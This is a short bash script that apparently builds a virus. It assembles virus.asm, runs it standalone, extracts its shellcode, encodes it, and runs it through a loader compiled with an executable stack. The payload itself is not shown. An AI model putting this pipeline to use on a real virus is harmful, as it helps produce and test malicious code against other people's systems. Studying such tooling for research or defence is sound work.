#!/bin/bash

# Get virus shellcode
nasm -felf64 virus.asm -o virus.asm.o
ld -o virus.asm.bin virus.asm.o
rm virus.asm.o
echo "Running virus standalone"
./virus.asm.bin
SHELLCODE=$(./dumpshellcode.sh virus.asm.bin)
rm virus.asm.bin

echo -ne "$SHELLCODE" > shellcode.bin
gcc add_encoding.c -o add_encoding.c.bin
./add_encoding.c.bin shellcode.bin
rm add_encoding.c.bin shellcode.bin
gcc run_shellcode.c -o run_shellcode.c.bin -z execstack
echo "Running stack"
./run_shellcode.c.bin
rm run_shellcode.c.bin a.out
